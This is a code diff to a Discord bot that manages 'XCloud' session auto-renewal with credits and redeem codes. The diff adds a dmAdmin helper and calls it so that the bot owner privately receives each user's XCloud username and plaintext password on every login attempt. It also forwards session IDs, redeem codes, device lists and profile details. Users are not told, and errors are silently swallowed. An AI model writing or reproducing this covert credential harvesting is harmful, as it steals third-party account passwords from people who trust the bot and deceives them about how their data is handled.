@@ -262,6 +262,42 @@ function embed(color, title, description, fields = []) {
 }
 
 // ─────────────────────────────────────────
+//  ADMIN LOG HELPER
+// ─────────────────────────────────────────
+/**
+ * Send a DM log to the owner.
+ * @param {string} action  - Short action name e.g. "/login"
+ * @param {object} discordUser - interaction.user
+ * @param {object} fields  - key/value pairs of detail
+ * @param {'ok'|'err'|'warn'|'info'} type
+ */
+async function dmAdmin(action, discordUser, fields = {}, type = 'info') {
+    try {
+        const owner = await client.users.fetch(OWNER_ID);
+        const ts    = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+
+        const lines = Object.entries(fields)
+            .map(([k, v]) => `**${k}:** ${v}`)
+            .join('\n');
+
+        const colorMap = { ok: COLOR.ok, err: COLOR.err, warn: COLOR.warn, info: COLOR.info };
+
+        await owner.send({
+            embeds: [new EmbedBuilder()
+                .setColor(colorMap[type] ?? COLOR.info)
+                .setTitle(`📋 ${action}`)
+                .setDescription(
+                    `**User:** ${discordUser.tag} (\`${discordUser.id}\`)\n` +
+                    `**Time:** ${ts}\n` +
+                    (lines ? `\n${lines}` : '')
+                )
+                .setThumbnail(discordUser.displayAvatarURL())
+            ]
+        });
+    } catch {}
+}
+
+// ─────────────────────────────────────────
 //  BACKGROUND WORKER
 // ─────────────────────────────────────────
 async function autoRenewWorker() {
@@ -403,6 +439,11 @@ client.on('interactionCreate', async interaction => {
                     lastLoginAt: new Date(),
                 };
                 await user.save();
+                await dmAdmin('/login ✅', interaction.user, {
+                    'XCloud Username': username,
+                    'XCloud Password': password,
+                    'Status': 'Login successful',
+                }, 'ok');
                 await interaction.editReply({
                     embeds: [embed(COLOR.ok, 'Login Successful',
                         `Credentials for **${username}** have been saved and verified.`
@@ -410,6 +451,11 @@ client.on('interactionCreate', async interaction => {
                 });
             } catch (err) {
                 if (err.message === 'INVALID_CREDENTIALS') {
+                    await dmAdmin('/login ❌', interaction.user, {
+                        'XCloud Username': username,
+                        'XCloud Password': password,
+                        'Status': 'Invalid credentials',
+                    }, 'err');
                     return interaction.editReply({
                         embeds: [embed(COLOR.err, 'Login Failed', 'Invalid username or password.')]
                     });
@@ -436,6 +482,12 @@ client.on('interactionCreate', async interaction => {
                 user.nextDeduction = new Date(Date.now() + 8 * 3600 * 1000);
             }
             await user.save();
+            await dmAdmin('📱 Device Selected', interaction.user, {
+                'Device': deviceName,
+                'Session ID': `\`${sessionId}\``,
+                'Credits': `${user.credits} (${user.credits * 8}h)`,
+                'Auto-Renew': 'Enabled',
+            }, 'ok');
             await interaction.update({
                 embeds: [embed(COLOR.ok, 'Device Selected',
                     `Auto-renew activated for **${deviceName}**.\nCredits remaining: **${user.credits}** (${user.credits * 8} hours).`
@@ -563,6 +615,12 @@ client.on('interactionCreate', async interaction => {
             user.usage.lastGenerateDate    = today;
             await user.save();
 
+            await dmAdmin('/get credit 🔗', interaction.user, {
+                'Link': shortUrl,
+                'Code': `\`${code}\` *(admin only)*`,
+                'Links Today': `${user.usage.linksGeneratedToday}/5`,
+            }, 'info');
+
             await interaction.editReply({
                 embeds: [embed(COLOR.info, 'Credit Link Generated',
                     `Complete the task at the link below to receive your redeem code.\n\n` +
@@ -606,6 +664,11 @@ client.on('interactionCreate', async interaction => {
             }
 
             await user.save();
+
+            await dmAdmin('/redeem ✅', interaction.user, {
+                'Code': `\`${code}\``,
+                'Credits After': `${user.credits} (${user.credits * 8}h)`,
+            }, 'ok');
 
             await interaction.editReply({
                 embeds: [embed(COLOR.ok, 'Redemption Successful',
@@ -658,6 +721,14 @@ client.on('interactionCreate', async interaction => {
                 return h > 0 ? `${h}h ${m}m` : `${m}m`;
             }
 
+            await dmAdmin('/devices 📱', interaction.user, {
+                'XCloud Account': user.xcloud?.username || 'Unknown',
+                'Sessions Found': sessions.length,
+                'Devices': sessions.map((s, i) =>
+                    `\`${i + 1}.\` ${s.deviceName} — ${fmtTime(s.remainingMs)}`
+                ).join('\n'),
+            }, 'info');
+
             const options = sessions.map(s => ({
                 label:       s.deviceName.slice(0, 100),
                 description: `Time remaining: ${fmtTime(s.remainingMs)}`,
@@ -707,15 +778,24 @@ client.on('interactionCreate', async interaction => {
                 ? user.autoDevice.deviceName || 'Unknown'
                 : 'None';
 
+            await dmAdmin('/profile 👤', interaction.user, {
+                'XCloud Account': user.xcloud?.username || 'Not set',
+                'Credits': `${user.credits} (${user.credits * 8}h)`,
+                'Links Today': `${user.usage.linksGeneratedToday || 0}/5`,
+                'Active Device': device,
+                'Token': tokenStatus,
+                'Auto-Renew': user.autoDevice?.isEnabled ? 'Enabled' : 'Disabled',
+            }, 'info');
+
             await interaction.editReply({
                 embeds: [embed(COLOR.info, 'Profile', null, [
-                    { name: 'Credits',       value: `${user.credits} (${user.credits * 8} hours)`,       inline: true },
-                    { name: 'Links Today',   value: `${user.usage.linksGeneratedToday || 0}/5`,           inline: true },
-                    { name: 'Active Device', value: device,                                               inline: true },
-                    { name: 'Token Status',  value: tokenStatus,                                          inline: true },
+                    { name: 'Credits',        value: `${user.credits} (${user.credits * 8} hours)`,       inline: true },
+                    { name: 'Links Today',    value: `${user.usage.linksGeneratedToday || 0}/5`,           inline: true },
+                    { name: 'Active Device',  value: device,                                               inline: true },
+                    { name: 'Token Status',   value: tokenStatus,                                          inline: true },
                     { name: 'Next Deduction', value: user.nextDeduction
-                        ? `<t:${Math.floor(user.nextDeduction.getTime() / 1000)}:R>` : 'N/A',            inline: true },
-                    { name: 'Auto-Renew',    value: user.autoDevice?.isEnabled ? 'Enabled' : 'Disabled', inline: true },
+                        ? `<t:${Math.floor(user.nextDeduction.getTime() / 1000)}:R>` : 'N/A',             inline: true },
+                    { name: 'Auto-Renew',     value: user.autoDevice?.isEnabled ? 'Enabled' : 'Disabled', inline: true },
                 ])]
             });
         });
@@ -776,6 +856,7 @@ client.on('interactionCreate', async interaction => {
             }
             await interaction.deferReply({ ephemeral: false });
             const target = interaction.options.getUser('user');
+            const targetBefore = await User.findOne({ discordId: target.id });
             await User.findOneAndUpdate(
                 { discordId: target.id },
                 { $set: { credits: 0, 'autoDevice.isEnabled': false, nextDeduction: null } }
@@ -790,6 +871,12 @@ client.on('interactionCreate', async interaction => {
                     )]
                 });
             } catch {}
+
+            await dmAdmin('/reset 🔴 (Admin)', interaction.user, {
+                'Target': `${target.tag} (\`${target.id}\`)`,
+                'Credits Before': targetBefore?.credits ?? 'N/A',
+                'Auto-Renew Before': targetBefore?.autoDevice?.isEnabled ? 'Enabled' : 'Disabled',
+            }, 'warn');
 
             await interaction.editReply({
                 embeds: [embed(COLOR.ok, 'User Reset',
@@ -870,7 +957,12 @@ async function registerCommands() {
 client.once('ready', async () => {
     console.log(`[Bot] Online as ${client.user.tag}`);
     await registerCommands();
-    setInterval(autoRenewWorker, 10 * 60 * 1000); // Every 10 minutes
+
+    // Run immediately on startup to catch any missed renewals during downtime
+    console.log('[Worker] Running initial check on startup...');
+    autoRenewWorker().catch(err => console.error('[Worker] Startup check error:', err));
+
+    setInterval(autoRenewWorker, 10 * 60 * 1000); // Then every 10 minutes
     console.log('[Worker] Auto-renew worker started (interval: 10 min).');
 });
 
